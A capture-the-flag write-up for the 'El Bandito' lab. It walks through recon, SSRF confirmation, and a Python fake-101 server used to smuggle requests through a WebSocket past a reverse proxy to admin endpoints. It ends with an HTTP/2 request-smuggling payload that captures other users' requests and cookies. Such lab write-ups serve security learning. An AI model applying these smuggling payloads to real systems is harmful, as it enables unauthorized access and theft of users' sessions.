<blockquote>
<b>EL BANDITO</b><br>
</blockquote>

<blockquote>
  <b>Recon</b><br><br>
  - First I ran a nmap scan with:
  <pre>
    sudo nmap -sC -sV -vv 10.48.129.1
  </pre>
  - We find 4 ports are open.<br>
  <br><img width="534" alt="image" src="https://github.com/user-attachments/assets/f171ab9a-99fc-4ca5-a267-b7165a849dd7" /><br>
  - There is a http server running on port 8080 and a https server running on port 80.<br>
  <br><img width="999" alt="image" src="https://github.com/user-attachments/assets/c2e7a36a-7e08-4cb6-96c6-05f1ecc82821" /><br>
  <br><img width="993" alt="image" src="https://github.com/user-attachments/assets/bed45a08-99c1-4bcd-bc53-325886ff5986" /><br>
  - Let's take a look at both web-application.<br>
  - On port 8080 we can see 'Bandit-Coin' website.<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/75363506-d279-498c-8fec-4b9ef7f0931e" /><br>
  - On port 8080 we see a blank page with text:<br>
  <br><img width="1470" height="808" alt="image" src="https://github.com/user-attachments/assets/af8dfd1b-9abd-46c2-a0e9-f9942f0a29ab" /><br>
</blockquote>

<blockquote>
  <b>Exploring The Webservers</b><br><br>
  - Let's explore the 'Bandit-Coin' website further.<br>
  - There are only two options we can interact with: 'Services' and 'Burn Token'.<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/1ba0f053-582a-4634-b1eb-df0d4ba2a3f7" /><br>
  - After seeing the source-code of 'Services' page I found something interesting.Two GET requests are being sent to an endpoint '/isOnline?url='.This could be an SSRF(Server Side Request Forgery) vulnerability<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/b4be9abf-1b4d-466c-b63e-c4308f57b6f1" /><br>
  - On the 'Burn Token' page there are input fields 'Token Address' and 'Amount'.But the 'Burn' option doesn't do anything.Nothing changes.<br>
  - If we check the source-code we can see somekind of webSocket is being used.<br>
  <br><img width="1468" alt="image" src="https://github.com/user-attachments/assets/91dc6b5e-8012-4014-8512-c4f4e085b5e7" /><br>
  - But when we check the Network tab we can see webSocket isn't working.<br>
  <br><img width="662" alt="image" src="https://github.com/user-attachments/assets/059f1261-2473-4526-9c99-a897271106f2" /><br>
  - One thing is clear there is a webSocket present.<br>
  - I couldn't find anything interesting so I start to run gobuster to enumerate directories and extensions with command:
  <pre>
    gobuster dir -u http://10.48.151.156:8080 -w /usr/share/wordlists/dirb/big.txt -x .php,.js,.txt,.py
  </pre>
  - Most of the result is forbidden i.e. the reverse proxy is restricting us from accessing these pages.Some directories like '/health','/info','/token' can be accessed but doesn't give much.<br>
  <br><img width="1141" alt="image" src="https://github.com/user-attachments/assets/c56176db-a472-4da4-9a12-9a6d6763389c" /><br>
  <br><img width="1138" alt="image" src="https://github.com/user-attachments/assets/c62e30d9-2c90-4fa8-9b47-1139d4962740" /><br>
  - Next let's visit the https webserver running on port 80.Upon seeing the source-code we can see a javascript file is being loaded.<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/4915e908-da89-45e4-8b79-493a35be96bc" /><br>
  - Let's see that javascript file by visiting '/static/messages.js' endpoint.We can see the logic of some chat application.Some ineteresting endpoints like '/getMessages' , '/send_message' can be discovered.<br>
  <br><img width="1465" alt="image" src="https://github.com/user-attachments/assets/9dbb83a5-fe60-4150-910b-d835f2d303ae" /><br>
  <br><img width="1253" alt="image" src="https://github.com/user-attachments/assets/652e2fcc-7420-4857-a2f7-37b95c8cfbee" /><br>
  - When I tried to go to '/getMessages' endpoint I found a Login form.<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/71623d61-9ae5-4b4f-ae73-af8bf5813d1b" /><br>
  - That means to interact with the chat application first we need to Login.<br>
  
</blockquote>

<blockquote>
  <b>Getting First Flag:</b>by HTTP request smuggling via WebSocket<br><br>
  - We found a possible SSRF on 'Bandit-Coin' website.Let's confirm that.<br>
  - First we will load the 'Services' page and intercept the request.<br>
  <br><img width="1469" alt="image" src="https://github.com/user-attachments/assets/63dbf6be-5b74-493e-9dce-d0d021ddee09" /><br>
  - And modify the url to send GET request to our own server.<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/c9fb9983-37a3-4ed8-ac68-72c9f4ea1625" /><br>
  - As we receive a connection it's confirmed SSRF.<br>
  <br><img width="651" alt="image" src="https://github.com/user-attachments/assets/250d26e2-3ee3-4330-b4d1-c3a5b5d86354" /><br>
  - Can we use this SSRF to abuse the WebSocket for request smuggling?If somehow we can trick the proxy into believing a valid WebSocket connection has been established,Then we can access restricted endpoints.<br>
  - To do this we have to run a server that will reply with a fake '101 Switching Protocols' response.And then we will use the SSRF vulnerability to send GET request to our web server.<br>
  - We can quickly set up a web server that responds with status 101 to every request with the following Python code:<br>

```python
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 1:
    print("""
Usage: {} 
    """.format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.protocol_version = "HTTP/1.1"
       self.send_response(101)
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()

```
  <br>
  - Let's save this code as 'server.py' and  then run it.<br>
  <br><img width="731" alt="image" src="https://github.com/user-attachments/assets/e9052089-c4e2-4aca-b35f-1d7c328fd99e" /><br>
  - Now send a GET request to 'isOnline?url=' with url of our webserver along with the smuggled request of the restricted endpoint that we want to access.Our target is '/trace' cause that might reveal important information.<br>
  <br><img width="996" alt="image" src="https://github.com/user-attachments/assets/e513322d-eacd-4c80-950f-61d3e26bb6c8" /><br>
  (NOTE:we have to disable 'update content length' and add two new lines at the end of our smuggled request)<br>
  - After sending the above request we receive valid response and we find some interesting endpoints '/admin-creds' and '/admin-flag'.<br>
  <br><img width="1326" alt="image" src="https://github.com/user-attachments/assets/aacc0d68-f24a-42d5-9c9a-c305808c1555" /><br>
  - Now we change our smuggled request and repeat the process to visit '/admin-creds' and '/admin-flags'.<br>
  - The response from '/admin-creds' contain Login credentials that we can use to Log in to the chat app on port 80.<br>
  <br><img width="1329" alt="image" src="https://github.com/user-attachments/assets/2f23f1bb-1287-49ba-926b-7195262f5edb" /><br>
  - '/admin-flag' gives us the first flag.<br>
  <br><img width="1332" alt="image" src="https://github.com/user-attachments/assets/7d6e98fd-135c-4a51-aac1-d4300e239caf" /><br>

</blockquote>
<blockquote>
   <b>Getting Second Flag:</b>by HTTP/2 request smuggling<br><br>
  - First login to the chat app by visiting 'https://target_machine_ip:80/getMessages'.<br>
  <br><img width="1124" alt="image" src="https://github.com/user-attachments/assets/1caf8e32-bfea-456f-a553-b45d76a9e622" /><br>
  - We can see two chats with 'Jack' and 'Oliver'.I tried to send a XSS payload to check if XSS is possible.Didn't work.<br>
  - Let's try to send a message and intercept the request to examine.First thing I notice is it's HTTP/2 request.<br>
  <br><img width="1326" alt="image" src="https://github.com/user-attachments/assets/ad521bad-6328-4e8d-80e4-24a59b2281d4" /><br>
  - We can try to smuggle a HTTP/1.1 request inside HTTP/2 request.We will set the Content-Length of first request to 0.That way the backend server will stop reading after that and the remaining part will be considered another request.<br>
  - We can send the following payload:

  ```http

    POST / HTTP/2
    Host: 10.48.146.23:80
    Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.ahSl-A.atrpTZhA7yx-SHWHu-UY7hEybd8
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 0
    
    POST /send_message HTTP/1.1
    Host: 10.48.146.23:80
    Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.ahSl-A.atrpTZhA7yx-SHWHu-UY7hEybd8
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 1000

    data=


```
<br>
  (NOTE:we have to intercept both '/messages' and '/getMessages' request atleast once in burp.Also disable 'Update Content-Length' option in repeater setting and add 2 new lines at the end)<br>
  - Any request sent by another user(or bot) after this payload will append to second part of our payload.As the cookie is set to our session cookie and it's a POST request to '/send_message' ,the content of another users request will be sent as a message from us.So if we refresh our chat page the content of the request will be visible.<br>
  - Let's send the payload.We get a 200 response.<br>
  <br><img width="1326" alt="image" src="https://github.com/user-attachments/assets/9b945d3f-e4c3-4f95-b854-abac68f1a020" /><br>
  - We have to send the payload again immediately.This time burp will wait for the response.<br>
  <br><img width="1328" alt="image" src="https://github.com/user-attachments/assets/072852d3-c81a-46ef-84cf-bcfbc0623f13" /><br>
  - After sometime we will receive 503 error response.<br>
  <br><img width="1327" alt="image" src="https://github.com/user-attachments/assets/76dcfa09-2a84-4e25-af35-f618eb86843a" /><br>
  - Now we have to repeat this same process every 5-10 seconds interval for 5-6 times.After that we have to refresh the chat page and we can see the flag.<br>
  <br><img width="1125" alt="image" src="https://github.com/user-attachments/assets/0cfa1e12-4109-4c68-a1b6-19cbe2a3b266" /><br>
  (NOTE: It took me multiple attempts to get the flag.At the beginning it was not working.After waiting for sometime I repeatedly did it. And then i started to see the chat page update)<br>

</blockquote>
